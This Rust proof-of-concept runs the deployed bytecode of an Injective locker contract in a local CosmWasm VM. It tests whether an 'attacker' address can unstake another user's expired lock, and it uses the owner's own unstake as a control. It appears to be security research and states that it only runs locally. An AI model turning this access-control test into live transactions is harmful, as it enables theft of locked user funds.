//! Runs the EXACT deployed CosmWasm bytecode of the Injective locker (code 1178)
//! inside cosmwasm-vm and tests whether a non-owner caller can unstake an
//! expired lock. Read-only: executes the wasm locally only; nothing is sent
//! to any chain.
use cosmwasm_std::{
    Binary, ContractResult as StdContractResult, Empty, SystemResult, Timestamp, WasmQuery,
};
use cosmwasm_vm::testing::{MockApi, MockQuerier, MockStorage};
use cosmwasm_vm::{
    call_execute, call_instantiate, call_query, Backend, Instance, InstanceOptions,
};

const WASM: &[u8] = include_bytes!("../deployed-locker-1178.wasm");
const LP_TOKEN: &str = "lp_token_contract";
const LOCKER_BALANCE: &str = "1000000000"; // mock CW20 balance of the locker

fn b64(data: &[u8]) -> String {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(T[(n >> 18) as usize & 63] as char);
        out.push(T[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 { T[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[n as usize & 63] as char } else { '=' });
    }
    out
}

fn make_instance() -> Instance<MockApi, MockStorage, MockQuerier> {
    let mut querier = MockQuerier::new(&[]);
    querier.update_wasm(|q: &WasmQuery| match q {
        WasmQuery::Smart { contract_addr, .. } if contract_addr == LP_TOKEN => {
            let resp = serde_json::json!({"balance": LOCKER_BALANCE});
            SystemResult::Ok(StdContractResult::Ok(Binary::from(resp.to_string().as_bytes())))
        }
        _ => SystemResult::Err(cosmwasm_std::SystemError::NoSuchContract {
            addr: "unknown".to_string(),
        }),
    });
    let backend = Backend { api: MockApi::default(), storage: MockStorage::default(), querier };
    Instance::from_code(WASM, backend, InstanceOptions { gas_limit: 500_000_000_000, print_debug: false }, None).unwrap()
}

fn main() {
    let mut instance = make_instance();
    println!("wasm loaded + validated by cosmwasm-vm; capabilities: {:?}", instance.required_capabilities());

    let owner = "owner_locker";
    let fee = "fee_address";
    let lp_owner = "lp_owner_1111111111111111111111111111111111";
    let attacker = "attacker_1111111111111111111111111111111111";

    // instantiate {owner, fees_percentage, fee_address}
    let init = serde_json::json!({"owner": owner, "fees_percentage": 1, "fee_address": fee});
    let r = call_instantiate::<_, _, _, Empty>(&mut instance, &cosmwasm_vm::testing::mock_env(), &cosmwasm_vm::testing::mock_info(owner, &[]), init.to_string().as_bytes());
    match r {
        Ok(StdContractResult::Ok(resp)) => println!("instantiate OK: attrs={:?}", resp.attributes),
        Ok(StdContractResult::Err(e)) => { println!("instantiate contract ERR: {e}"); return; }
        Err(e) => { println!("instantiate VM ERR: {e}"); return; }
    }

    // find a valid locktime constant and lock 100000 LP
    let candidates: [u64; 8] = [2_592_000, 7_776_000, 15_552_000, 31_536_000, 63_072_000,
                                2_629_800, 7_889_400, 15_778_800];
    let mut ok_locktime = None;
    for cand in candidates {
        let lock_inner = serde_json::json!({"lock": {"locktime": cand}});
        let recv = serde_json::json!({"receive": {
            "sender": lp_owner, "amount": "100000", "msg": b64(lock_inner.to_string().as_bytes())
        }});
        let r = call_execute::<_, _, _, Empty>(&mut instance, &cosmwasm_vm::testing::mock_env(), &cosmwasm_vm::testing::mock_info(LP_TOKEN, &[]), recv.to_string().as_bytes());
        match r {
            Ok(StdContractResult::Ok(resp)) => {
                println!("lock OK with locktime={cand}: msgs={} attrs={:?}", resp.messages.len(), resp.attributes);
                ok_locktime = Some(cand);
                break;
            }
            Ok(StdContractResult::Err(e)) => println!("locktime={cand} -> {e}"),
            Err(e) => { println!("lock VM ERR: {e}"); return; }
        }
    }
    let locktime = match ok_locktime { Some(v) => v, None => { println!("no valid locktime found"); return; } };

    // query locks
    let q = serde_json::json!({"get_liquidities": {}});
    let res = call_query(&mut instance, &cosmwasm_vm::testing::mock_env(), q.to_string().as_bytes()).unwrap().unwrap();
    let v: serde_json::Value = serde_json::from_slice(res.as_slice()).unwrap();
    println!("locks: {v}");
    let id = v["liquidities"][0]["id"].as_str().unwrap().to_string();
    let amt = v["liquidities"][0]["amount"].as_str().unwrap().to_string();
    let lowner = v["liquidities"][0]["owner"].as_str().unwrap().to_string();
    let end_time = v["liquidities"][0]["locktime"].as_u64().unwrap();
    println!("lock id={id} owner={lowner} amount={amt} end_time={end_time}");

    // fast-forward past locktime
    let mut env = cosmwasm_vm::testing::mock_env();
    env.block.time = Timestamp::from_seconds(end_time + 10_000);
    env.block.height += 1_000_000;

    // attacker (neither locker owner nor lp_owner) unstakes
    let unstake = serde_json::json!({"unstake": {"denom": id}});
    match call_execute::<_, _, _, Empty>(&mut instance, &env, &cosmwasm_vm::testing::mock_info(attacker, &[]), unstake.to_string().as_bytes()) {
        Ok(StdContractResult::Ok(resp)) => {
            println!("*** UNSTAKE BY NON-OWNER SUCCEEDED: msgs={} attrs={:?}", resp.messages.len(), resp.attributes);
            for m in &resp.messages {
                println!("   msg: {}", serde_json::to_string(&m.msg).unwrap_or_default());
            }
            let res2 = call_query(&mut instance, &cosmwasm_vm::testing::mock_env(), serde_json::json!({"get_liquidities": {}}).to_string().as_bytes()).unwrap().unwrap();
            println!("locks after: {}", String::from_utf8_lossy(res2.as_slice()));
        }
        Ok(StdContractResult::Err(e)) => println!("*** UNSTAKE BY NON-OWNER REJECTED BY CONTRACT: {e}"),
        Err(e) => println!("unstake VM ERR: {e}"),
    }

    // positive control: the real lock owner unstakes the same lock
    let unstake2 = serde_json::json!({"unstake": {"denom": id}});
    match call_execute::<_, _, _, Empty>(&mut instance, &env, &cosmwasm_vm::testing::mock_info(lp_owner, &[]), unstake2.to_string().as_bytes()) {
        Ok(StdContractResult::Ok(resp)) => {
            println!("positive control: lock owner unstake SUCCEEDED: msgs={} attrs={:?}", resp.messages.len(), resp.attributes);
            for m in &resp.messages {
                println!("   msg: {}", serde_json::to_string(&m.msg).unwrap_or_default());
            }
        }
        Ok(StdContractResult::Err(e)) => println!("positive control: owner unstake FAILED: {e}"),
        Err(e) => println!("positive control VM ERR: {e}"),
    }
}

/// Linker stub for wasmer 4.2.2 with modern rustc (__rust_probestack was removed from std).
#[no_mangle]
pub extern "C" fn __rust_probestack() {}
